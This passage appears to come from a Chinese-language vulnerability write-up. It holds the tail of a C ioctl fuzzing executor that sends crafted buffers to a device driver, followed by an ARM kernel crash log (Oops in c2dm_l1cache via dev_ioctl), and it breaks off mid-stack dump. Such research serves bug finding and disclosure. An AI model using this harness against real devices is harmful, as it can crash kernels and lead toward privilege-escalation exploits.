&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;(0x%x)\n&quot;, *(int *)&amp;ptr_arr[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;(0x%p) : &quot;, &amp;ptr_arr[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)ptr_arr[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;(0x%p) : &quot;, (&amp;ptr_arr[0]+1*8));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+1*8));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;(0x%p) : &quot;, (&amp;ptr_arr[0]+2*8));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+2*8));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;(0x%p) : &quot;, (&amp;ptr_arr[0]+3*8));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+3*8));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;(0x%p) : &quot;, (&amp;ptr_arr[0]+4*8));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+4*8));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+5*8));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+6*8));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;(0x%x)\n&quot;, (int *)ptr_arr, (int *)ptr_arr);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// time for the actual ioctl</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;Try to open device %s\n&quot;, dev_name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//fflush(stdout);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int fd = open(dev_name, O_RDONLY);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (fd &lt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(&quot;open&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Open devicd %s successfully.\n&quot;, dev_name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//fflush(stdout);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;Try to call ioctl(fd=%d, ioctl_id=%d, ptr_arr=%p)\n&quot;, fd, ioctl_id, ptr_arr[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fflush(stdout);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;%10d:&quot;, cnt++);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((ioctl(fd, ioctl_id, ptr_arr[0])) == -1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(&quot;ioctl&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;good hit\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close(fd);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;device %s closed\n&quot;, dev_name);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (retest)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fflush(stdout);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// okay now free all the shit we alloced</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free(recv_buf);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free(dev_name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (map != NULL)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free(map);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free(len_arr);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (i=0; i &lt; num_blobs; i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;%d: free&#39;ing %p\n&quot;, i, ptr_arr[i]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free(ptr_arr[i]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free(ptr_arr);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (i=0; i &lt; num_generics; i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free(generic_arr[i]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(client_sock, &amp;msg_size, 4);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg_size = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(read_size == 0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts(&quot;Client disconnected&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fflush(stdout);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close(client_sock);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto listen;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else if(read_size == -1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(&quot;recv failed&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h3 class="cs868C439D">
			<a name="崩溃日志"><span class="csD6CA00D2">崩溃日志</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">[ &nbsp;144.428375] Unable to handle kernel paging request at virtual address d900000c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.436462] pgd = dcac0000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.439697] [d900000c] *pgd=00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.443939] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.450012] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.457672] CPU: 0 &nbsp;&nbsp;&nbsp;Tainted: G &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;O &nbsp;(3.4.83-gd2afc0bae69 #1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.465118] PC is at c2dm_l1cache+0x30/0x100</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.469940] LR is at dev_ioctl+0x3f0/0x10c4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.474670] pc : [&lt;c03187ac&gt;] &nbsp;&nbsp;&nbsp;lr : [&lt;c031782c&gt;] &nbsp;&nbsp;&nbsp;psr: a0000013</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.474670] sp : c2d6be38 &nbsp;ip : 00000000 &nbsp;fp : c2d6be6c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.487640] r10: 00000000 &nbsp;r9 : d8c0cca8 &nbsp;r8 : 00b8dd90</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.493621] r7 : 00000000 &nbsp;r6 : c2d6bea4 &nbsp;r5 : 00b8dd90 &nbsp;r4 : 388b77c4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.500915] r3 : d9000004 &nbsp;r2 : 75e0c121 &nbsp;r1 : c2d6bea4 &nbsp;r0 : 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.508331] Flags: NzCv &nbsp;IRQs on &nbsp;FIQs on &nbsp;Mode SVC_32 &nbsp;ISA ARM &nbsp;Segment user</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.516418] Control: 10c5387d &nbsp;Table: 9cac004a &nbsp;DAC: 00000015</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.522827] </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.522857] PC: 0xc031872c:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.527954] 872c &nbsp;e51b2034 e592300c eaffffa5 e30c281c e34c209d e5923000 e3530000 1affffbd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.538482] 874c &nbsp;eaffffc0 e51b303c e51b1040 e2833001 e51b2034 e1530001 e50b303c e2822010</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.549163] 876c &nbsp;e50b2034 1affff8c eaffff83 c09dc81c e1a0c00d e92ddff0 e24cb004 e24dd00c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.559844] 878c &nbsp;e3500000 e1a07002 e50b0030 da00000d e0814200 e1a06001 e1a03001 e3a02000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.570404] 87ac &nbsp;e5930008 e593c004 e2833010 e1530004 e022209c 1afffff9 e3520902 3a000003</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.581085] 87cc &nbsp;e3570002 9a000022 e24bd028 e89daff0 e59f9090 e2818008 e3a0a000 e5963008</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.591735] 87ec &nbsp;e5184008 e3530000 13a05000 1a00000a ea000010 e5181004 e5993024 e0841001</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.602416] 880c &nbsp;e12fff33 e5962008 e2855001 e596300c e1550002 e0844003 2a000006 e2572000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.612976] </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.612976] LR: 0xc03177ac:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.618072] 77ac &nbsp;ebf55c15 eaffff35 e3053d8d e3443038 e1510003 1affff30 e1a0200d e3c23d7f</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.628631] 77cc &nbsp;e3c3303f e24b0064 e5933008 e2952038 30d22003 33a03000 e3530000 1a0001a8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.639160] 77ec &nbsp;e1a01005 e3a02038 ebfcfa90 e3500000 1a00000e e51b2030 e3520001 0a0001cb</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.649780] 780c &nbsp;e3520002 0a0001ee e3520000 1a000007 e51b0064 e3a02000 e24b1060 eb0003d3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.660369] 782c &nbsp;e51b0064 e24b1060 e51b2030 eb000338 e3a05000 eaffff11 e24b1064 e50b1088</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.670776] 784c &nbsp;e51b0088 e3a01010 ebfd03c1 e3a03004 e50b3064 e5963008 e2952004 30d22003</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.681213] 786c &nbsp;33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f e3c6603f</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.691528] 788c &nbsp;e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064 e1a01005</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.701995] </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.701995] SP: 0xc2d6bdb8:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.706878] bdb8 &nbsp;c2d6be24 00b8dd90 c2d6bdec c2d6bdd0 c00084d0 c03187ac a0000013 ffffffff</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.717407] bdd8 &nbsp;c2d6be24 00b8dd90 c2d6be6c c2d6bdf0 c06a5318 c0008370 00000000 c2d6bea4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.727905] bdf8 &nbsp;75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4 00000000 00b8dd90 d8c0cca8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.738586] be18 &nbsp;00000000 c2d6be6c 00000000 c2d6be38 c031782c c03187ac a0000013 ffffffff</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.749145] be38 &nbsp;c02ba53c 575b4b92 d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.759796] be58 &nbsp;d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.770355] be78 &nbsp;000ffeff 00000001 c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.781005] be98 &nbsp;c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.791687] </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.791687] FP: 0xc2d6bdec:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.796661] bdec &nbsp;c0008370 00000000 c2d6bea4 75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.807189] be0c &nbsp;00000000 00b8dd90 d8c0cca8 00000000 c2d6be6c 00000000 c2d6be38 c031782c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.817840] be2c &nbsp;c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000 00000000 00b8dd90</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.828399] be4c &nbsp;0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.839080] be6c &nbsp;c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc c2d6be90 c0207454</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.849761] be8c &nbsp;c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.860290] beac &nbsp;83b275c7 00000000 00020261 00000000 00000000 00000000 00000000 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.870971] becc &nbsp;00000000 00000000 00000000 c02089fc 00000000 dcae46c0 0000000b dcae46c0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.881652] </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.881652] R1: 0xc2d6be24:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.886627] be24 &nbsp;c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.897308] be44 &nbsp;00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.907989] be64 &nbsp;c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.918518] be84 &nbsp;c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.929199] bea4 &nbsp;4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.939849] bec4 &nbsp;00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.950531] bee4 &nbsp;0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.961059] bf04 &nbsp;c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.971710] </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.971710] R3: 0xd8ffff84:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.976623] ff84 &nbsp;d8ffff20 d8efb000 00000707 020e40fb d8efb075 d8ffff3c d8efb01c d8ffffa0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.987213] ffa4 &nbsp;d8ffffa0 d8efb028 ca9788f0 d8ffffb0 d8ffffb0 00000000 bf06e9c8 80000088</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;144.997772] ffc4 &nbsp;dd2eac00 dd309540 00000000 00000000 00000000 00000000 00000000 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.008392] ffe4 &nbsp;00000000 00000000 00000000 00000000 00000000 00000000 00000000 ********</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.018798] 0004 &nbsp;******** ******** ******** ******** ******** ******** ******** ********</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.029327] 0024 &nbsp;******** ******** ******** ******** ******** ******** ******** ********</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.039886] 0044 &nbsp;******** ******** ******** ******** ******** ******** ******** ********</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.050384] 0064 &nbsp;******** ******** ******** ******** ******** ******** ******** ********</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.060913] </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.060913] R6: 0xc2d6be24:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.066009] be24 &nbsp;c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.076568] be44 &nbsp;00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.087219] be64 &nbsp;c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.097900] be84 &nbsp;c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.108459] bea4 &nbsp;4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.118988] bec4 &nbsp;00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.129638] bee4 &nbsp;0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.140319] bf04 &nbsp;c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.150848] </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.150848] R9: 0xd8c0cc28:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.155944] cc28 &nbsp;d8c0cc28 d8c0cc28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.166503] cc48 &nbsp;00000000 00000000 d8c0cc50 d8c0cc50 00000000 c0aa5174 c0aa5174 c0aa5148</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.177062] cc68 &nbsp;5aefd94b 00000000 00000000 00000000 d8c0cc80 9ad1f453 00000000 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.187713] cc88 &nbsp;00200000 00000000 00000000 d8c0cc94 d8c0cc94 dd3b56c0 dd3b56c0 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.198394] cca8 &nbsp;000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.208923] ccc8 &nbsp;d8c0cd80 dd3e3e70 00001064 00000001 0fb00000 5aefd94b 2d2b4d13 5aefd94b</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.219573] cce8 &nbsp;2d2b4d13 5aefd94b 2d2b4d13 00000000 00000000 00000000 00000000 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.230255] cd08 &nbsp;00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0cd24</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.240936] Process executor32 (pid: 3810, stack limit = 0xc2d6a2f8)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.248016] Stack: (0xc2d6be38 to 0xc2d6c000)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.253082] be20: 